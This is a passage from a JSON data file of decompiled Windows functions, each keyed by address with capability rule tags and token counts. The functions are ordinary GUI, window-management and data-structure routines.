        "decompiled_code": "\nvoid __thiscall fcn.0041cee3(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = 0x7fffffff;\n    if (param_2 == 0x7fffffff) goto code_r0x0041cf02;\n    if (*param_1 == 0x7fffffff) goto code_r0x0041cf00;\n    if (*param_1 == param_2) goto code_r0x0041cf00;\n    do {\n        iVar1 = fcn.0041901a();\n        param_1 = extraout_ECX;\ncode_r0x0041cf00:\n        *param_1 = param_2;\ncode_r0x0041cf02:\n    } while (*param_1 == iVar1);\n    fcn.004320fb(*param_1);\n    return;\n}\n",
        "token_count": 203
    },
    "0041d148": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041d148(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n    iVar3 = 0;\n    if (0 < iVar1) {\n        do {\n            iVar2 = fcn.0041cdc9(iVar3);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(arg_8h + 4), iVar3);\n                if (iVar2 == arg_ch) goto code_r0x0041d1aa;\n            }\n            else {\n                if (*(iVar2 + 4) == arg_ch) {\ncode_r0x0041d1aa:\n                    iVar1 = fcn.0042b9b0(*(arg_8h + 4));\n                    return iVar1;\n                }\n                iVar2 = fcn.0041d148(iVar2, arg_ch);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 311
    },
    "0041e999": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041e999(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    if ((param_1 == 0) || (iVar5 = *(param_1 + 0x20),  iVar5 == 0)) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0);\n    while ((uVar2 & 0x40000000) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n        if (iVar3 == 0) break;\n        uVar2 = (*pcVar1)(iVar3, 0xfffffff0);\n        iVar5 = iVar3;\n    }\n    uVar4 = fcn.0041e67e(iVar5);\n    return uVar4;\n}\n",
        "token_count": 236
    },
    "0041e9fb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e9fb(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0041e9fb(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.0041e67e();\n            return;\n        }\n        iVar2 = fcn.0041e6a5(iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar3 = fcn.0041e9fb(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0041ebbc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041ebbc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar3 = *param_2;\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        piVar1 = fcn.0041e6a5(iVar3);\n        if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x100))(param_2),  iVar2 != 0)) break;\n        if (iVar3 == unaff_retaddr) {\n            return 0;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 188
    },
    "0041ed88": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041ed88(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint lpMsg;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&lpMsg, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n    }\n    fcn.0041e5da();\n    return;\n}\n",
        "token_count": 128
    },
    "0041f1fc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041f1fc(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar2 = *(param_1 + 0x20),  iVar2 != 0)) {\n        while( true ) {\n            uVar3 = (*pcVar1)(iVar2);\n            piVar4 = fcn.0041e67e(uVar3);\n            if ((piVar4 == NULL) || (iVar2 = (**(*piVar4 + 0x120))(),  iVar2 != 0)) break;\n            iVar2 = piVar4[8];\n        }\n        return piVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 196
    },
    "0041f3ee": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041f3ee(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = 0;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindow)(*(param_1 + 0x20), 5);\n    iVar3 = fcn.0041e67e(uVar2);\n    while (iVar3 != 0) {\n        uVar2 = (*pcVar1)(*(iVar3 + 0x20), 2);\n        iVar3 = fcn.0041e67e(uVar2);\n        iVar4 = iVar4 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 181
    },
    "0041ffa6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041ffa6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x20),  *(param_1 + 0x20) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.0041ff61(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0041e67e(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 147
    },
    "00423d24": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423d24(code **param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint uStack20;\n    \n    *param_1 = vtable.CStringList.0;\n    puVar2 = param_1[1];\n    while( true ) {\n        if (puVar2 == NULL) {\n            param_1[3] = NULL;\n            param_1[4] = NULL;\n            param_1[2] = NULL;\n            param_1[1] = NULL;\n            fcn.00436366();\n            param_1[5] = NULL;\n            return;\n        }\n        if (puVar2 == 0xfffffff8) break;\n        uStack20 = 0x423cfe;\n        fcn.00423c17();\n        puVar2 = *puVar2;\n    }\n    uStack20 = 0x4a8690;\n    fcn.00456b8d(&uStack20, 0x49ed44);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 245
    },
    "004242d4": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004242d4(uint *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    \n    *param_1 = param_2;\n    param_1[1] = 0;\n    if (*0x4ad190 == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32\");\n        if (iVar2 != 0) goto code_r0x00424307;\ncode_r0x00424302:\n        do {\n            fcn.0041901a();\ncode_r0x00424307:\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            *0x4ad180 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"CreateActCtxA\", unaff_ESI);\n            *0x4ad184 = (*pcVar1)(iVar2, \"ReleaseActCtx\");\n            *0x4ad188 = (*pcVar1)(iVar2, \"ActivateActCtx\");\n            *0x4ad18c = (*pcVar1)(iVar2, \"DeactivateActCtx\");\n            if (*0x4ad180 == 0) {\n                if ((*0x4ad184 != 0) || (*0x4ad188 != 0)) goto code_r0x00424302;\n            }\n            else if ((*0x4ad184 == 0) || (*0x4ad188 == 0)) goto code_r0x00424302;\n        } while (*0x4ad18c != 0);\n        *0x4ad190 = '\\x01';\n    }\n    return param_1;\n}\n",
        "token_count": 375
    },
    "00426675": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00426675(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x004266a4;\n    iVar3 = fcn.00426635();\n    if ((iVar3 == 0) && (iVar3 = fcn.0041cd8c(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x20); iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x004266a4:\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar6);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar5 == 0)) || (iVar3 == iVar6))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 483
    },
    "00427a20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427a20(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x20));\n    if (iVar1 != 0) goto code_r0x00427a3b;\n    do {\n        fcn.0041901a();\ncode_r0x00427a3b:\n    } while (arg_8h == 0);\n    var_24h = arg_8h;\n    var_28h = 4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x110c, 0, &var_28h);\n    return var_4h;\n}\n",
        "token_count": 202
    },
    "0042c20d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c20d(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_8h;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &arg_8h);\n    if (*piVar2 != 0) {\n        *arg_10h = -1;\n    }\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    arg_ch = 0;\n    while( true ) {\n        uVar3 = (*pcVar1)(arg_8h, 0x87, 0, 0);\n        if ((uVar3 & 0x40) != 0) {\n            if (*piVar2 == 0) {\n                (*pcVar1)(arg_8h, 0xf1, arg_ch == *arg_10h, 0);\n            }\n            else {\n                iVar4 = (*pcVar1)(arg_8h, 0xf0, 0, 0);\n                if (iVar4 != 0) {\n                    *arg_10h = arg_ch;\n                }\n            }\n            arg_ch = arg_ch + 1;\n        }\n        arg_8h = (*_sym.imp.USER32.dll_GetWindow)(arg_8h, 2);\n        if (arg_8h == NULL) break;\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xfffffff0);\n        if ((uVar3 & 0x20000) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0042e887": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042e887(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    uint unaff_ESI;\n    \n    if (param_1 != 0) goto code_r0x0042e896;\n    do {\n        fcn.0041901a();\ncode_r0x0042e896:\n    } while ((*(param_1 + 4) == 0) || (param_2 == 0));\n    (*_sym.imp.GDI32.dll_SetBkColor)(*(param_1 + 4), param_3);\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(param_1 + 4), 0, 0, 2, unaff_ESI, 0, 0, 0);\n    return;\n}\n",
        "token_count": 182
    },
    "004306e6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004306e6(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    \n    if (param_1 != NULL) goto code_r0x004306ef;\n    do {\n        fcn.0041901a();\n        param_1 = extraout_ECX;\ncode_r0x004306ef:\n        iVar1 = (***param_1)();\n    } while (iVar1 == 0);\n    if (iVar1 != 0) goto code_r0x004306bc;\n    do {\n        iVar1 = fcn.0041901a();\ncode_r0x004306bc:\n    } while (param_2 == 0);\n    do {\n        if (iVar1 == param_2) {\n            return 1;\n        }\n        iVar1 = *(iVar1 + 0x10);\n    } while (iVar1 != 0);\n    return 0;\n}\n",
        "token_count": 212
    },
    "004310f1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004310f1(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    \n    iVar5 = *param_1;\n    if (iVar5 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (iVar5 == param_2) {\n            piVar2 = fcn.004310bb(param_2);\n            *param_1 = *piVar2;\n        }\n        else {\n            do {\n                piVar2 = fcn.004310bb(iVar5);\n                if (*piVar2 == param_2) break;\n                piVar2 = fcn.004310bb();\n                iVar5 = *piVar2;\n            } while (iVar5 != 0);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            puVar3 = fcn.004310bb(param_2);\n            puVar4 = fcn.004310bb(iVar5);\n            *puVar4 = *puVar3;\n        }\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 278
    },
    "004312cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004312cc(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    if ((0 < arg_8h) && (arg_8h < *(in_ECX + 0xc))) {\n        for (iVar3 = *(in_ECX + 0x14); iVar3 != 0; iVar3 = *(iVar3 + 4)) {\n            if (arg_8h < *(iVar3 + 8)) {\n                puVar2 = *(*(iVar3 + 0xc) + arg_8h * 4);\n                if (puVar2 != NULL) {\n                    (***puVar2)(1);\n                }\n                *(*(iVar3 + 0xc) + arg_8h * 4) = 0;\n            }\n        }\n        puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n        *puVar1 = *puVar1 & 0xfffffffe;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00431765": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00431765(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint32_t *param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    *param_4 = param_2 >> 4;\n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 191
    },
    "0043179d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043179d(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t extraout_ECX;\n    uint *puVar1;\n    \n    if (param_1 == 0) {\n        fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00431804": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00431804(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (*(param_1 + 4) == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar3 = *(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4;\n        puVar1 = *puVar3;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            if (puVar2[1] == param_2) {\n                *puVar3 = *puVar2;\n                fcn.0043174c(puVar2);\n                return 0x1;\n            }\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 218
    },
    "00431fa9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431fa9(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != 0) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "0043242b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043242b(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x00432441;\n    for (param_3 = *(param_1 + 4); (param_3 != NULL && (param_3[2] != param_2)); param_3 = *param_3) {\ncode_r0x00432441:\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00436366": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436366(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.004170df(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0043b204": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0043b204(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t unaff_retaddr;\n    \n    while( true ) {\n        if (param_2 == 0) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(param_2);\n        if (iVar1 == unaff_retaddr) break;\n        param_2 = (*_sym.imp.USER32.dll_GetWindow)(param_2, 2);\n    }\n    return param_2;\n}\n",
        "token_count": 129
    },
    "0043b310": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043b310(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumUnknown.0;\n    pcVar2 = NULL;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if ((pcVar1 == NULL) && (pcVar1 = extraout_ECX[10],  extraout_ECX[0xc] != NULL)) {\n        do {\n            (**(**(pcVar1 + pcVar2 * 4) + 8))(*(pcVar1 + pcVar2 * 4));\n            pcVar2 = pcVar2 + 1;\n        } while (pcVar2 < extraout_ECX[0xc]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0044a9c3();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 290
    },
    "0043fc95": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043fc95(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *(*(param_1 + 8) + 4);\n    iVar3 = 0;\n    uVar4 = 0;\n    if (uVar1 != 0) {\n        do {\n            cVar2 = fcn.0043defa(uVar4);\n            if ((cVar2 != '\\0') && (iVar3 = fcn.0043daf5(uVar4),  iVar3 < 0)) {\n                return iVar3;\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < uVar1);\n    }\n    return iVar3;\n}\n",
        "token_count": 187
    },
    "004400b7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004400b7(int32_t *arg_8h)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    if (arg_8h == NULL) {\ncode_r0x004400c8:\n        iVar3 = -0x7fffbffb;\n    }\n    else {\n        if (in_ECX[1] == 0) {\n            return 0;\n        }\n        ppcVar1 = *arg_8h;\n        arg_8h = NULL;\n        iVar3 = (**ppcVar1)(puVar2, 0x48f6c4, &arg_8h);\n        if (-1 < iVar3) {\n            if (*in_ECX == 0) {\n                if (arg_8h != NULL) {\n                    (**(*arg_8h + 8))(arg_8h);\n                }\n                goto code_r0x004400c8;\n            }\n            uVar4 = 0;\n            if (in_ECX[1] != 0) {\n                do {\n                    (**(*arg_8h + 0x18))(arg_8h, *(*in_ECX + uVar4 * 8), 0);\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < in_ECX[1]);\n            }\n        }\n        in_ECX[1] = 0;\n        fcn.004170df(*in_ECX);\n        *in_ECX = 0;\n        if (arg_8h != NULL) {\n            (**(*arg_8h + 8))(arg_8h);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 406
    },
    "00440d67": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00440d67(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *(*(param_1 + 8) + 4);\n    iVar2 = 0;\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        do {\n            iVar2 = fcn.0044097e();\n            if (iVar2 < 0) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 153
    },
    "00443157": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00443157(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBX;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar4 = 0;\n    iVar5 = iVar4;\n    if (param_2 != 0) {\n        do {\n            iVar5 = param_2;\n            uVar2 = (*pcVar1)(*(iVar5 + 0x20), 0xfffffff0);\n            if ((uVar2 & 0xc0000000) != 0x40000000) {\n                return iVar4;\n            }\n            if (iVar5 == unaff_EBX) {\n                return iVar4;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar5 + 0x20));\n            param_2 = fcn.0041e67e(uVar3);\n            uVar2 = (*pcVar1)(*(param_2 + 0x20), 0xffffffec);\n            iVar4 = iVar5;\n        } while ((uVar2 & 0x10000) == 0);\n    }\n    return iVar5;\n}\n",
        "token_count": 293
    },
    "00443286": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443286(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if (param_1 != 0) {\n        piVar4 = NULL;\n        iVar3 = param_1;\n        do {\n            iVar1 = *(iVar3 + 0x4c);\n            if ((iVar1 != 0) || (piVar4 = *(iVar3 + 0x50),  piVar4 != NULL)) break;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar3 + 0x20));\n            iVar3 = fcn.0041e67e(uVar2);\n        } while (iVar3 != 0);\n        if ((iVar3 != 0) && (iVar1 == 0)) {\n            (**(*piVar4 + 0xb0))();\n            uVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar3 = fcn.0041e67e(uVar2);\n            if ((iVar3 != param_1) && (iVar3 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x20)),  iVar3 != 0)) {\n                if (*(param_1 + 0x50) != 0) {\n    // WARNING: Could not recover jumptable at 0x00422775. Too many branches\n    // WARNING: Treating indirect jump as call\n                    (**(**(param_1 + 0x50) + 0xb0))();\n                    return;\n                }\n                uVar2 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x20));\n                fcn.0041e67e(uVar2);\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "004432f3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00443312)\n// WARNING: Removing unreachable block (ram,0x00443314)\n// WARNING: Removing unreachable block (ram,0x00443330)\n// WARNING: Removing unreachable block (ram,0x00443339)\n// WARNING: Removing unreachable block (ram,0x0044333e)\n// WARNING: Removing unreachable block (ram,0x0044334a)\n// WARNING: Removing unreachable block (ram,0x0044334e)\n// WARNING: Removing unreachable block (ram,0x00443352)\n// WARNING: Removing unreachable block (ram,0x00443356)\n// WARNING: Removing unreachable block (ram,0x00443362)\n// WARNING: Removing unreachable block (ram,0x0044331b)\n// WARNING: Removing unreachable block (ram,0x0044332e)\n\nvoid fcn.004432f3(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x20));\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "0044336e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044336e(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t noname_5;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_EBX;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    int32_t noname_4;\n    uint noname_6;\n    int32_t noname_4_00;\n    \n    noname_4_00 = param_2;\n    noname_5 = fcn.0042244f();\n    if (noname_5 == 0) {\n        noname_6 = 1;\n        noname_4 = param_1;\n        iVar1 = fcn.004431ac(param_1, 0, 1, unaff_EBX, noname_4_00, unaff_EDI, unaff_retaddr, param_1, param_2, param_3)\n        ;\n        noname_1 = iVar1;\n        if (iVar1 == param_1) {\n            noname_5 = 0;\n        }\n        else {\n            do {\n                iVar2 = fcn.00422681();\n                if (iVar2 == noname_4_00) {\n                    return noname_1;\n                }\n                noname_1 = fcn.004431ac(param_1, noname_1, 1, param_1, noname_4, noname_5, noname_6, unaff_EBX, \n                                        noname_4_00, unaff_EDI);\n            } while ((noname_1 != 0) && (noname_1 != iVar1));\n            noname_5 = 0;\n        }\n    }\n    return noname_5;\n}\n",
        "token_count": 401
    },
    "00443412": {
        "rules": [
            "contain loop"
        ],
